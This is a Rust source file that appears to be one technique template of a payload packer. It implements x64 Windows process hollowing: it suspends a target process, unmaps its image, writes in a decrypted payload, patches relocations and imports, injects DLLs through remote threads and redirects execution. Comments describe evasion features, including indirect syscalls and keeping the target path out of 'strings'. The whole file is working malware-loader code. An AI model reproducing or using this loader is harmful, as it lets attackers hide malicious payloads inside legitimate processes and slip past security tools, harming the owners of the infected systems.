// --- Process hollowing (technique fragment) ---

use windows::core::{PCSTR, PSTR};
use windows::Win32::Foundation::{CloseHandle, BOOL, HANDLE};
use windows::Win32::System::Diagnostics::Debug::{
    GetThreadContext, SetThreadContext, CONTEXT, CONTEXT_FULL_AMD64,
};
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
use windows::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PAGE_READWRITE,
};
use windows::Win32::System::Threading::{
    CreateProcessA, CreateRemoteThread, GetExitCodeProcess, WaitForSingleObject, CREATE_SUSPENDED,
    PROCESS_INFORMATION, STARTUPINFOA,
};

// The kernel-facing calls (NtAllocateVirtualMemory, NtWriteVirtualMemory,
// NtReadVirtualMemory, NtResumeThread, NtUnmapViewOfSection,
// NtProtectVirtualMemory, NtSuspendThread) go through the `nt_*` helpers
// provided by the syscall layer, so this fragment is identical for
// `build.stub.syscalls.mode: none` and `build.stub.syscalls.mode: indirect`.
// `CreateRemoteThread` and `GetModuleHandleA`/`GetProcAddress` remain Win32
// imports (the `NtCreateThreadEx` path needs more stack arguments than the
// indirect trampoline currently carries — see the technique README).

// --- PE constants ---
const IMAGE_DOS_SIGNATURE: u16 = 0x5A4D;
const IMAGE_NT_SIGNATURE: u32 = 0x0000_4550;
const IMAGE_FILE_MACHINE_AMD64: u16 = 0x8664;

/// Minimal section header view.
struct Section {
    virtual_size: u32,
    virtual_address: u32,
    size_of_raw_data: u32,
    pointer_to_raw_data: u32,
}

/// `GetThreadContext`/`SetThreadContext` require a 16-byte aligned `CONTEXT`
/// on x64; the `windows` binding only guarantees 8, so force it here.
#[repr(align(16))]
struct AlignedContext(CONTEXT);

/// Minimal PE view.
struct Pe {
    image_base: u64,
    size_of_image: u32,
    size_of_headers: u32,
    entry_point_rva: u32,
    sections: Vec<Section>,
    reloc_rva: u32,
    reloc_size: u32,
    import_rva: u32,
    import_size: u32,
}

/// Runs the decrypted payload via process hollowing and returns its exit code.
///
/// The hollowing target path is substituted at build time by
/// `Params::render_fragment` with code that rebuilds the string at runtime, so
/// it never appears in `strings`.
fn execute_payload(image: &mut [u8]) -> Result<i32, String> {
    let hollow_target = $HOLLOW_TARGET_DEF$;
    let pe = parse_pe(image)?;
    let process = run_stage_two(&hollow_target, image, &pe)?;
    Ok(wait_and_exit(process))
}

// --- Minimal PE parsing (offsets relative to the decrypted image) ---

fn parse_pe(image: &[u8]) -> Result<Pe, String> {
    if image.len() < 64 {
        return Err("payload too small to be a PE".to_string());
    }
    if read_u16(image, 0)? != IMAGE_DOS_SIGNATURE {
        return Err("invalid DOS header (missing MZ signature)".to_string());
    }
    let e_lfanew = read_u32(image, 0x3C)? as usize;
    if read_u32(image, e_lfanew)? != IMAGE_NT_SIGNATURE {
        return Err("invalid NT header (missing PE signature)".to_string());
    }

    let machine = read_u16(image, e_lfanew + 4)?;
    if machine != IMAGE_FILE_MACHINE_AMD64 {
        return Err(format!(
            "unsupported architecture (machine 0x{machine:04x}); expected x64"
        ));
    }

    let num_sections = read_u16(image, e_lfanew + 6)? as usize;
    let size_of_optional_header = read_u16(image, e_lfanew + 20)? as usize;

    let opt = e_lfanew + 4 + 20;
    let entry_point_rva = read_u32(image, opt + 16)?;
    let image_base = read_u64(image, opt + 24)?;
    let size_of_image = read_u32(image, opt + 56)?;
    let size_of_headers = read_u32(image, opt + 60)?;

    // Base relocation directory (data directory index 5).
    let num_dirs = read_u32(image, opt + 108)?;
    let (reloc_rva, reloc_size) = if num_dirs > 5 {
        (read_u32(image, opt + 152)?, read_u32(image, opt + 156)?)
    } else {
        (0, 0)
    };
    // Import directory (data directory index 1).
    let (import_rva, import_size) = if num_dirs > 1 {
        (read_u32(image, opt + 120)?, read_u32(image, opt + 124)?)
    } else {
        (0, 0)
    };

    let section_table = opt + size_of_optional_header;
    let mut sections = Vec::with_capacity(num_sections);
    for i in 0..num_sections {
        let s = section_table + i * 40;
        if s + 40 > image.len() {
            return Err("section table out of bounds".to_string());
        }
        sections.push(Section {
            virtual_size: read_u32(image, s + 8)?,
            virtual_address: read_u32(image, s + 12)?,
            size_of_raw_data: read_u32(image, s + 16)?,
            pointer_to_raw_data: read_u32(image, s + 20)?,
        });
    }

    Ok(Pe {
        image_base,
        size_of_image,
        size_of_headers,
        entry_point_rva,
        sections,
        reloc_rva,
        reloc_size,
        import_rva,
        import_size,
    })
}

fn rva_to_offset(pe: &Pe, rva: u32) -> Option<usize> {
    for sec in &pe.sections {
        let size = sec.virtual_size.max(sec.size_of_raw_data);
        if rva >= sec.virtual_address && rva < sec.virtual_address + size {
            return Some((rva - sec.virtual_address + sec.pointer_to_raw_data) as usize);
        }
    }
    None
}

fn apply_relocations(image: &mut [u8], pe: &Pe, delta: isize) -> Result<(), String> {
    if pe.reloc_size == 0 {
        return Ok(());
    }
    let start = rva_to_offset(pe, pe.reloc_rva)
        .ok_or_else(|| "could not map the relocation table to a file offset".to_string())?;
    let end = start + pe.reloc_size as usize;
    if end > image.len() {
        return Err("relocation table out of bounds".to_string());
    }

    let mut off = start;
    while off + 8 <= end {
        let page_rva = read_u32(image, off)?;
        let block_size = read_u32(image, off + 4)?;
        if block_size < 8 || off + block_size as usize > end {
            return Err("malformed relocation block".to_string());
        }
        let count = (block_size - 8) / 2;
        for i in 0..count {
            let entry = read_u16(image, off + 8 + (i * 2) as usize)?;
            let typ = entry >> 12;
            let rva = page_rva + (entry & 0xFFF) as u32;
            let file_off = match rva_to_offset(pe, rva) {
                Some(o) => o,
                None => continue,
            };
            match typ {
                // IMAGE_REL_BASED_DIR64: patch a 64-bit field.
                3 => {
                    let v = read_u64(image, file_off)?;
                    write_u64(image, file_off, (v as isize + delta) as u64)?;
                }
                // IMAGE_REL_BASED_HIGHLOW: patch a 32-bit field.
                10 => {
                    let v = read_u32(image, file_off)?;
                    write_u32(image, file_off, (v as isize + delta) as u32)?;
                }
                // ABSOLUTE and everything else: skip.
                _ => {}
            }
        }
        off += block_size as usize;
    }
    Ok(())
}

/// Resolves the payload's import table and writes the resulting addresses into
/// the image's IAT (in place, so the following `write_image` ships them to the
/// target).
///
/// `LoadLibraryA`/`GetProcAddress` run in the *current* process: the system
/// DLLs are mapped at one base per session, so their addresses are also valid
/// in the target as long as the target has the DLL mapped. Imports that cannot
/// be resolved abort here, before the thread is redirected (the payload must
/// never start with a half-filled IAT).
fn resolve_and_patch_imports(image: &mut [u8], pe: &Pe) -> Result<(), String> {
    let imports = crate::resolve_imports(image, pe.import_rva, pe.import_size, |rva| {
        rva_to_offset(pe, rva)
    })
    .map_err(|e| format!("could not resolve the payload's imports: {e}"))?;

    for (iat_rva, address) in imports {
        let offset = rva_to_offset(pe, iat_rva)
            .ok_or_else(|| format!("the IAT slot at RVA 0x{iat_rva:08x} is not mapped"))?;
        write_u64(image, offset, address)?;
    }
    Ok(())
}

fn run_stage_two(target: &str, image: &mut [u8], pe: &Pe) -> Result<HANDLE, String> {
    // 1. Create the target process suspended.
    let (process, thread) = spawn_suspended(target)?;

    // 2. Read its image base from the PEB.
    let base = resolve_image_base(process, thread)?;

    // 3. Let the target's loader initialize: patch the original entry point to
    //    an infinite loop, resume the thread, wait until it parks in the loop
    //    (the loader has then finished mapping the process's default DLLs and
    //    populated `PEB->Ldr`), and suspend it again. The original image is
    //    unmapped below, so the patched bytes never need restoring.
    let target_entry = resolve_target_entry(process, base)?;
    patch_entry_to_spin(process, target_entry)?;
    run_loader_and_wait(thread, target_entry)?;

    // 4. Load every DLL the payload imports *in the target*. The import
    //    addresses resolved in step 8 are session-wide, so they are valid only
    //    if the target has the DLL mapped. `LoadLibraryA` on an already-loaded
    //    DLL is a no-op, so loading unconditionally is safe.
    load_imports_in_target(process, image, pe)?;

    // 5. Unmap the original image.
    let status = crate::nt_unmap_view(process, base as *mut core::ffi::c_void);
    if status < 0 {
        return Err(format!("unmap failed (0x{:08x})", status as u32));
    }

    // 6. Re-allocate memory at the same base. The helper writes the actual
    //    base back through `address` (it may differ from the preferred one).
    let mut address = base as *mut core::ffi::c_void;
    let mut region_size = pe.size_of_image as usize;
    let status = crate::nt_alloc_vm(
        process,
        &mut address,
        0,
        &mut region_size,
        MEM_COMMIT.0 | MEM_RESERVE.0,
        PAGE_EXECUTE_READWRITE.0,
    );
    if status < 0 {
        return Err(format!("allocation failed (0x{:08x})", status as u32));
    }
    let address = address as u64;

    // 7. Fix up relocations if the base differs from the preferred one.
    let delta = address as isize - pe.image_base as isize;
    if delta != 0 {
        apply_relocations(image, pe, delta)?;
    }

    // 8. Resolve the payload's imports and fill in its IAT. The addresses are
    //    resolved in this process, but the target now has every imported DLL
    //    mapped (step 4), so they are valid there too. Any failure aborts
    //    before the thread is redirected, so the payload never runs with a
    //    half-filled IAT.
    resolve_and_patch_imports(image, pe)?;

    // 9. Write the image (with the resolved IAT already in place).
    write_image(process, address, image, pe)?;

    // 10. Redirect the thread to the payload entry point.
    redirect_entry(thread, address, pe.entry_point_rva)?;

    // 11. Resume the thread and keep only the process handle.
    let mut previous = 0u32;
    let status = crate::nt_resume_thread(thread, &mut previous);
    if status < 0 {
        return Err(format!("resume failed (0x{:08x})", status as u32));
    }
    unsafe {
        let _ = CloseHandle(thread);
    }

    Ok(process)
}

fn spawn_suspended(target: &str) -> Result<(HANDLE, HANDLE), String> {
    // Token 0 of a Windows command line is the executable name, never an
    // argument: the payload's `argv[0]` is the target's file name, and the
    // YAML/runtime payload args follow it (see the technique README).
    let exe_name = target
        .rsplit(|c| c == '\\' || c == '/')
        .next()
        .filter(|name| !name.is_empty())
        .unwrap_or(target);
    let line = crate::build_command_line(exe_name);

    let mut app = target.as_bytes().to_vec();
    app.push(0);
    let mut cmd = line.into_bytes();
    cmd.push(0);

    let mut startup: STARTUPINFOA = unsafe { std::mem::zeroed() };
    startup.cb = std::mem::size_of::<STARTUPINFOA>() as u32;
    let mut pi: PROCESS_INFORMATION = unsafe { std::mem::zeroed() };

    unsafe {
        CreateProcessA(
            PCSTR(app.as_ptr()),
            PSTR(cmd.as_mut_ptr()),
            None,
            None,
            BOOL(0),
            CREATE_SUSPENDED,
            None,
            PCSTR::null(),
            &startup,
            &mut pi,
        )
    }
    .map_err(|e| format!("CreateProcessA failed: {e}"))?;

    Ok((pi.hProcess, pi.hThread))
}

fn resolve_image_base(process: HANDLE, thread: HANDLE) -> Result<u64, String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe { GetThreadContext(thread, &mut ctx.0) }
        .map_err(|e| format!("GetThreadContext failed: {e}"))?;

    // On x64, Rdx holds the PEB address; ImageBaseAddress sits at PEB + 0x10.
    let peb = ctx.0.Rdx;
    let mut base: u64 = 0;
    read_remote(process, peb + 0x10, &mut base)?;

    Ok(base)
}

/// Reads the target's `AddressOfEntryPoint` from its mapped headers and returns
/// the absolute entry-point address.
fn resolve_target_entry(process: HANDLE, base: u64) -> Result<u64, String> {
    // PE32+: `e_lfanew` at DOS offset 0x3C; `AddressOfEntryPoint` is the field
    // at optional-header offset 16, after the signature (4) + file header (20).
    let mut e_lfanew: u32 = 0;
    read_remote(process, base + 0x3C, &mut e_lfanew)?;
    let mut entry_rva: u32 = 0;
    read_remote(process, base + e_lfanew as u64 + 4 + 20 + 16, &mut entry_rva)?;
    Ok(base + entry_rva as u64)
}

/// Makes the entry page writable and overwrites its first two bytes with
/// `jmp $` (`EB FE`), so the target parks in an infinite loop once its loader
/// reaches the entry point.
fn patch_entry_to_spin(process: HANDLE, target_entry: u64) -> Result<(), String> {
    let mut old = 0u32;
    let status = crate::nt_protect_vm(
        process,
        target_entry as *mut core::ffi::c_void,
        0x1000,
        PAGE_EXECUTE_READWRITE.0,
        &mut old,
    );
    if status < 0 {
        return Err(format!("entry protection failed (0x{:08x})", status as u32));
    }

    let spin = [0xEBu8, 0xFE];
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        target_entry as *const core::ffi::c_void,
        spin.as_ptr() as *const core::ffi::c_void,
        spin.len(),
        &mut written,
    );
    if status < 0 {
        return Err(format!("entry patch failed (0x{:08x})", status as u32));
    }
    Ok(())
}

/// Resumes the target so its loader initializes, waits until the thread parks
/// in the patched entry-point loop, then suspends it again.
fn run_loader_and_wait(thread: HANDLE, target_entry: u64) -> Result<(), String> {
    let mut previous = 0u32;
    let status = crate::nt_resume_thread(thread, &mut previous);
    if status < 0 {
        return Err(format!("initial resume failed (0x{:08x})", status as u32));
    }

    // Poll until the instruction pointer reaches the spin loop: that only
    // happens after the loader has finished initializing the process. Bounded
    // so a wedged target fails loudly instead of hanging the packer.
    let deadline = std::time::Instant::now() + std::time::Duration::from_secs(30);
    loop {
        let rip = thread_rip(thread)?;
        if rip == target_entry {
            break;
        }
        if std::time::Instant::now() >= deadline {
            return Err("timed out waiting for the target loader to initialize".to_string());
        }
        std::thread::sleep(std::time::Duration::from_millis(10));
    }

    let mut previous = 0u32;
    let status = crate::nt_suspend_thread(thread, &mut previous);
    if status < 0 {
        return Err(format!("suspend failed (0x{:08x})", status as u32));
    }
    Ok(())
}

/// Returns the thread's current instruction pointer.
fn thread_rip(thread: HANDLE) -> Result<u64, String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe { GetThreadContext(thread, &mut ctx.0) }
        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
    Ok(ctx.0.Rip)
}

/// Resolves `LoadLibraryA`'s address in the current process.
///
/// System DLLs share one base per session, so the address is also valid in the
/// hollowing target (kernel32 is mapped once the target's loader has run).
fn resolve_load_library(
) -> Result<unsafe extern "system" fn(*mut core::ffi::c_void) -> u32, String> {
    let kernel32: String = $KERNEL32_DEF$;
    let load_library: String = $LOAD_LIBRARY_DEF$;
    let kernel32_c =
        std::ffi::CString::new(kernel32).map_err(|_| "invalid kernel32 name".to_string())?;
    let load_library_c = std::ffi::CString::new(load_library)
        .map_err(|_| "invalid LoadLibraryA name".to_string())?;

    let module = unsafe { GetModuleHandleA(PCSTR(kernel32_c.as_ptr() as *const u8)) }
        .map_err(|_| "could not locate kernel32".to_string())?;
    let Some(proc) =
        (unsafe { GetProcAddress(module, PCSTR(load_library_c.as_ptr() as *const u8)) })
    else {
        return Err("could not resolve LoadLibraryA".to_string());
    };

    // `LoadLibraryA(LPCSTR) -> HMODULE` is ABI-compatible with a thread start
    // routine (one pointer argument in rcx, result in rax/eax), so its address
    // can run directly as a remote thread's entry point.
    Ok(unsafe { std::mem::transmute(proc) })
}

/// Returns the (deduplicated) names of the DLLs the payload imports.
fn imported_dll_names(image: &[u8], pe: &Pe) -> Result<Vec<String>, String> {
    let mut names: Vec<String> = Vec::new();
    if pe.import_rva == 0 || pe.import_size == 0 {
        return Ok(names);
    }

    let mut desc = rva_to_offset(pe, pe.import_rva)
        .ok_or_else(|| "import directory is not mapped".to_string())?;
    loop {
        let original_thunk = read_u32(image, desc)?;
        let name_rva = read_u32(image, desc + 12)?;
        let first_thunk = read_u32(image, desc + 16)?;
        if original_thunk == 0 && name_rva == 0 && first_thunk == 0 {
            break;
        }
        if name_rva != 0 {
            let name_off = rva_to_offset(pe, name_rva)
                .ok_or_else(|| "DLL name is not mapped".to_string())?;
            let end = image[name_off..]
                .iter()
                .position(|&b| b == 0)
                .ok_or_else(|| "unterminated DLL name".to_string())?;
            let name = String::from_utf8_lossy(&image[name_off..name_off + end]).into_owned();
            if !names.contains(&name) {
                names.push(name);
            }
        }
        desc += 20;
    }
    Ok(names)
}

/// Loads every DLL the payload imports into the target process.
///
/// Each DLL name is written into the target and loaded with a remote thread
/// that calls `LoadLibraryA` there. This is what gives the target the DLL's
/// base (and its TLS slot), so the session-wide import addresses resolved later
/// actually point at mapped memory.
fn load_imports_in_target(process: HANDLE, image: &[u8], pe: &Pe) -> Result<(), String> {
    let names = imported_dll_names(image, pe)?;
    if names.is_empty() {
        return Ok(());
    }

    let load_library = resolve_load_library()?;

    for name in names {
        let display = name.clone();
        let mut name_bytes = name.into_bytes();
        name_bytes.push(0);

        let mut address: *mut core::ffi::c_void = std::ptr::null_mut();
        let mut size = name_bytes.len();
        let status = crate::nt_alloc_vm(
            process,
            &mut address,
            0,
            &mut size,
            MEM_COMMIT.0 | MEM_RESERVE.0,
            PAGE_READWRITE.0,
        );
        if status < 0 {
            return Err(format!("DLL-name allocation failed (0x{:08x})", status as u32));
        }

        let mut written = 0usize;
        let status = crate::nt_write_vm(
            process,
            address as *const core::ffi::c_void,
            name_bytes.as_ptr() as *const core::ffi::c_void,
            name_bytes.len(),
            &mut written,
        );
        if status < 0 {
            return Err(format!("DLL-name write failed (0x{:08x})", status as u32));
        }

        let thread = unsafe {
            CreateRemoteThread(
                process,
                None,
                0,
                Some(load_library),
                Some(address as *const core::ffi::c_void),
                0,
                None,
            )
        }
        .map_err(|_| format!("could not load '{display}' in the target"))?;
        unsafe {
            let _ = WaitForSingleObject(thread, u32::MAX);
            let _ = CloseHandle(thread);
        }
    }

    Ok(())
}

/// Reads a fixed-size value from the target's address space.
fn read_remote<T: Copy>(process: HANDLE, address: u64, value: &mut T) -> Result<(), String> {
    let mut read = 0usize;
    let status = crate::nt_read_vm(
        process,
        address as *const core::ffi::c_void,
        value as *mut T as *mut core::ffi::c_void,
        std::mem::size_of::<T>(),
        &mut read,
    );
    if status < 0 {
        return Err(format!("read failed (0x{:08x})", status as u32));
    }
    Ok(())
}

fn write_image(process: HANDLE, base: u64, image: &[u8], pe: &Pe) -> Result<(), String> {
    // Headers first.
    write_remote(process, base, &image[..pe.size_of_headers as usize])?;
    // Then each section.
    for sec in &pe.sections {
        let start = sec.pointer_to_raw_data as usize;
        let end = start + sec.size_of_raw_data as usize;
        if end > image.len() {
            return Err("section data out of bounds".to_string());
        }
        write_remote(
            process,
            base + sec.virtual_address as u64,
            &image[start..end],
        )?;
    }
    Ok(())
}

fn write_remote(process: HANDLE, base: u64, data: &[u8]) -> Result<(), String> {
    if data.is_empty() {
        return Ok(());
    }
    let mut written = 0usize;
    let status = crate::nt_write_vm(
        process,
        base as *const core::ffi::c_void,
        data.as_ptr() as *const core::ffi::c_void,
        data.len(),
        &mut written,
    );
    if status < 0 {
        return Err(format!("write failed (0x{:08x})", status as u32));
    }
    Ok(())
}

fn redirect_entry(thread: HANDLE, base: u64, entry_rva: u32) -> Result<(), String> {
    let mut ctx = AlignedContext(CONTEXT::default());
    ctx.0.ContextFlags = CONTEXT_FULL_AMD64;
    unsafe { GetThreadContext(thread, &mut ctx.0) }
        .map_err(|e| format!("GetThreadContext failed: {e}"))?;
    ctx.0.Rcx = base + entry_rva as u64;
    unsafe { SetThreadContext(thread, &ctx.0) }
        .map_err(|e| format!("SetThreadContext failed: {e}"))?;
    Ok(())
}

fn wait_and_exit(process: HANDLE) -> i32 {
    unsafe {
        let _ = WaitForSingleObject(process, u32::MAX);
        let mut code: u32 = 0;
        let _ = GetExitCodeProcess(process, &mut code);
        let _ = CloseHandle(process);
        code as i32
    }
}

// --- Bounds-checked little-endian reads/writes ---

fn read_u16(b: &[u8], off: usize) -> Result<u16, String> {
    let s = b
        .get(
            off..off
                .checked_add(2)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u16::from_le_bytes([s[0], s[1]]))
}

fn read_u32(b: &[u8], off: usize) -> Result<u32, String> {
    let s = b
        .get(
            off..off
                .checked_add(4)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u32::from_le_bytes([s[0], s[1], s[2], s[3]]))
}

fn read_u64(b: &[u8], off: usize) -> Result<u64, String> {
    let s = b
        .get(
            off..off
                .checked_add(8)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "read out of bounds".to_string())?;
    Ok(u64::from_le_bytes([
        s[0], s[1], s[2], s[3], s[4], s[5], s[6], s[7],
    ]))
}

fn write_u32(b: &mut [u8], off: usize, v: u32) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(4)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "write out of bounds".to_string())?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}

fn write_u64(b: &mut [u8], off: usize, v: u64) -> Result<(), String> {
    let s = b
        .get_mut(
            off..off
                .checked_add(8)
                .ok_or_else(|| "offset overflow".to_string())?,
        )
        .ok_or_else(|| "write out of bounds".to_string())?;
    s.copy_from_slice(&v.to_le_bytes());
    Ok(())
}
